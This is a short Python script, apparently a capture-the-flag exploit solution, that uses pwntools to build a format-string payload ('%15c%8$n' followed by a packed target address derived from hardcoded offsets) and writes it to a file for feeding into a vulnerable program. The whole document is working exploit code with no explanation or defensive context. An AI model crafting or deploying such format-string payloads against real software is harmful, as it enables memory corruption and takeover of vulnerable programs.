from pwn import *
fd=open('./msg','w+')
pay='%15c%8$n'+p64(0x55729cad6197-0x3197+0x53AC+2)
fd.write(pay)